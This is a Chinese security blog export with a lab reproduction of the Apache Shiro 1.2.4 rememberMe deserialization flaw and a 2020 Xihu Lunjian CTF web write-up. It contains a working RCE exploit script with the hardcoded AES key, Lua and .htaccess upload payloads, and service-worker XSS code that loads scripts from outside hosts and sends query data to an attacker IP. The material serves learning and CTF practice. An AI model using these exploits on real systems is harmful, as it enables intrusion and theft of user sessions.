    <url>/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>很久的洞了，看起来感觉很简单，用起来的时候就不是那么简单了，还是需要好好调试一下的</p>
<a id="more"></a>

<h1 id="0x01-docker-环境"><a href="#0x01-docker-环境" class="headerlink" title="0x01 docker 环境"></a>0x01 docker 环境</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201107222926819.png" alt="image-20201107222926819"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">'http://192.168.59.128:80'</span>, <span class="string">'touch /tmp/test'</span>)</span><br></pre></td></tr></table></figure>

<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201108231526653.png" alt="image-20201108231526653" style="zoom:200%;">

<h1 id="0x02-调试环境"><a href="#0x02-调试环境" class="headerlink" title="0x02 调试环境"></a>0x02 调试环境</h1><blockquote>
<p>win10  jdk1.8.0_102/jdk1.8.0_261  tomcat9.0.37</p>
</blockquote>
<p>shiro 下载链接 <a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
<p>下载完后用idea打开samples/web目录，然后在pom.xml中加入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后maven下载包，之后用tomcat部署web，</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075808033.png" alt="image-20201110075808033"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110075835741.png" alt="image-20201110075835741"></p>
<p>然后运行即可。</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109205358251.png" alt="image-20201109205358251"></p>
<p>本地测试 jdk1.8.0_102成功弹出计算器</p>
<p>本地测试jdk1.8.0_261成功弹出计算器</p>
<h2 id="2-1-分析加密过程"><a href="#2-1-分析加密过程" class="headerlink" title="2.1 分析加密过程"></a>2.1 分析加密过程</h2><p>在AbstractRememberMeManager.class的onSuccessfulLogin()函数下断点，开启调试，发包</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109212754918.png" alt="image-20201109212754918"></p>
<p>跟进<code>rememberIdentity()</code></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230309287.png" alt="image-20201109230309287"></p>
<p>然后到达<code>convertPrincipalsToBytes()</code>，</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225957934.png" alt="image-20201109225957934"></p>
<p>可以看出是先进行序列化，</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109230738143.png" alt="image-20201109230738143"></p>
<p>然后再加密，加密采用AES的CBC模式</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201109225722244.png" alt="image-20201109225722244"></p>
<p>对应的AES的密钥为<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解密值。</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081043680.png" alt="image-20201110081043680"></p>
<p>之后产生初始化的IV，进行加密。</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081437570.png" alt="image-20201110081437570"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110081702788.png" alt="image-20201110081702788"></p>
<h2 id="2-2-解密过程分析"><a href="#2-2-解密过程分析" class="headerlink" title="2.2 解密过程分析"></a>2.2 解密过程分析</h2><p>断点断在<code>AbstractRememberMeManager.class</code>的<code>getRememberedPrincipals()</code>。</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083556969.png" alt="image-20201110083556969"></p>
<p><code>getRememberedSerializedIdentity()</code>函数将RememberMe的cookie值base64解码，</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110083822727.png" alt="image-20201110083822727"></p>
<p>然后跟进<code>convertBytesToPrincipals()</code>函数，</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084048135.png" alt="image-20201110084048135"></p>
<p>然后进行解密</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084206912.png" alt="image-20201110084206912"></p>
<p>对应的AES解密的密钥为<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解密值。</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110091326886.png" alt="image-20201110091326886"></p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084247565.png" alt="image-20201110084247565"></p>
<p>解密完后进行反序列化</p>
<p><img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110084721992.png" alt="image-20201110084721992"></p>
<p>cookie解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    cipher = base64.b64decode(cookie)</span><br><span class="line">    IV   = cipher[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    remember_bin = encryptor.decrypt(cipher)</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    cookie=<span class="string">""""""</span></span><br><span class="line">    print(decode_rememberme(cookie))</span><br></pre></td></tr></table></figure>

<img src="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/image-20201110090831607.png" alt="image-20201110090831607" style="zoom:150%;">

<p>参考：</p>
<p><a href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">shiro 反序列化复现</a>    </p>
<p><a href="https://sherlocz.github.io/2020/08/02/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">shiro 1.2.4反序列化漏洞分析</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020西湖论剑web-wp</title>
    <url>/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/</url>
    <content><![CDATA[<p>23333333333333</p>
<a id="more"></a>

<h1 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h1><p>方法一：lua</p>
<p>1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: newupload.xhlj.wetolink.com</span><br><span class="line">Content-Length: 209</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com&#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;gkqh0jd0dmt742l6r5k85qnp20</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">AddHandler lua-script  .lua</span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt--</span><br></pre></td></tr></table></figure>

<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: newupload.xhlj.wetolink.com</span><br><span class="line">Content-Length: 770</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;newupload.xhlj.wetolink.com&#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;gkqh0jd0dmt742l6r5k85qnp20</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;2.lua&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt--</span><br></pre></td></tr></table></figure>

<p>3</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082132421.png" alt="image-20201016082132421"></p>
<p>方法二：蚁剑</p>
<p>换行绕过上传php</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082732515.png" alt="image-20201016082732515"></p>
<p><a href="https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php/encoder" target="_blank" rel="noopener">利用编码器</a>连接蚁剑，</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082617534.png" alt="image-20201016082617534"></p>
<p>利用蚁剑插件通过fpm绕过disabled_function，测试没有成功</p>
<h1 id="0x02-hardxss"><a href="#0x02-hardxss" class="headerlink" title="0x02 hardxss"></a>0x02 hardxss</h1><p>在登录处右键源代码可以看见如下的代码</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021093130506.png" alt="image-20201021093130506"></p>
<p><code>auto_reg_vat()</code>会把get传的参数存储到key和value中，然后赋给window全局变量，这里存在变量覆盖，可以通过get传入callback来xss。</p>
<p>这道题利用service worker，service worker个人认为可以理解为代理，应该是用来离线缓存资源，另外关键的一点就是service worker必须在https和localhost上才能运行。</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021094327839.png" alt="image-20201021094327839"></p>
<p>222.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> iff = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iff.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line">iff.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iff);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("/api/loginStatus?callback=self.importScripts('//www.mount4in.tk/a/sw.js');//")`</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sw.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'install ok!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event.request);</span><br><span class="line">    event.respondWith(</span><br><span class="line">    caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> requestBackend(event);</span><br><span class="line">    &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestBackend</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = event.request.clone();</span><br><span class="line">    <span class="built_in">console</span>.log(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">"&lt;script&gt;alert(location.search);&lt;/script&gt;"</span>, &#123;<span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021151947512.png" alt="image-20201021151947512"></p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021152005317.png" alt="image-20201021152005317"></p>
<p>登录劫持</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021152827670.png" alt="image-20201021152827670"></p>
<p>另外还可以利用<a href="https://repl.it开启一个php" target="_blank" rel="noopener">https://repl.it开启一个php</a> web server来解决</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//666.js</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> iff = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iff.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line">iff.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iff);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("/api/loginStatus?callback=importScripts('//aa.mount4in.repl.co/sw6.js');//")`</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sw6.js</span></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'service worker install!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = event.request.clone();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'url: '</span>, url);</span><br><span class="line">    <span class="keyword">var</span> body = <span class="string">'&lt;script&gt;window.open("http://ip:9988?test="+location.search)&lt;/script&gt;'</span>;</span><br><span class="line">    <span class="keyword">var</span> init = &#123;<span class="attr">headers</span>: &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">var</span> res = <span class="keyword">new</span> Response(body, init);</span><br><span class="line">    event.respondWith(res.clone());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201022172601545.png" alt="image-20201022172601545"></p>
<h1 id="0x03-flagshop"><a href="#0x03-flagshop" class="headerlink" title="0x03 flagshop"></a>0x03 flagshop</h1><p><a href="http://flagshop.xhlj.wetolink.com/" target="_blank" rel="noopener">http://flagshop.xhlj.wetolink.com/</a></p>
<p>有任意文件读写漏洞</p>
<p>backend.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$offset = <span class="keyword">isset</span>($_GET[<span class="string">'offset'</span>]) ? $_GET[<span class="string">'offset'</span>] : <span class="number">0</span>;</span><br><span class="line">$buffer = <span class="keyword">isset</span>($_GET[<span class="string">'buffer'</span>]) ? $_GET[<span class="string">'buffer'</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'writefile'</span>])) &#123;</span><br><span class="line">    $fp = fopen($_GET[<span class="string">'writefile'</span>], <span class="string">"a"</span>);</span><br><span class="line">    fseek($fp, $offset);</span><br><span class="line">    fwrite($fp, $buffer);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'readfile'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'readfile'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先了解下面几个文件</p>
<blockquote>
<h3 id="proc-pid-maps"><a href="#proc-pid-maps" class="headerlink" title="/proc/pid/maps"></a>/proc/pid/maps</h3><p>包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address           perms offset  dev   inode   pathname</span><br><span class="line">08048000-08056000 r-xp 00000000 03:0c 64593   &#x2F;usr&#x2F;sbin&#x2F;gpm</span><br><span class="line">08056000-08058000 rw-p 0000d000 03:0c 64593   &#x2F;usr&#x2F;sbin&#x2F;gpm</span><br><span class="line">08058000-0805b000 rwxp 00000000 00:00 0</span><br><span class="line">40000000-40013000 r-xp 00000000 03:0c 4165    &#x2F;lib&#x2F;ld-2.2.4.so</span><br><span class="line">40013000-40015000 rw-p 00012000 03:0c 4165    &#x2F;lib&#x2F;ld-2.2.4.so</span><br><span class="line">4001f000-40135000 r-xp 00000000 03:0c 45494   &#x2F;lib&#x2F;libc-2.2.4.so</span><br><span class="line">40135000-4013e000 rw-p 00115000 03:0c 45494   &#x2F;lib&#x2F;libc-2.2.4.so</span><br><span class="line">4013e000-40142000 rw-p 00000000 00:00 0</span><br><span class="line">bffff000-c0000000 rwxp 00000000 00:00 0</span><br></pre></td></tr></table></figure>

<ul>
<li>address,表示进程占用的地址.</li>
<li>perms, 表示一系列权限.r=read,w=write,x=execute,s=shared,p=private(copy on write)</li>
<li>offset, 表示文件偏移量</li>
<li>dev:表示设备 (主要设备,次要设备)</li>
<li>inode: 表示设备上面的inode编号.如果是0,表示没有索引节点与内存区域关联,就如同BSS段一样.</li>
<li>pathname,在Linux2.0之前,没有pathname字段.</li>
</ul>
<h3 id="proc-self-exe"><a href="#proc-self-exe" class="headerlink" title="/proc/self/exe"></a>/proc/self/exe</h3><p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件</p>
<h3 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="/proc/self/mem"></a>/proc/self/mem</h3><p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
</blockquote>
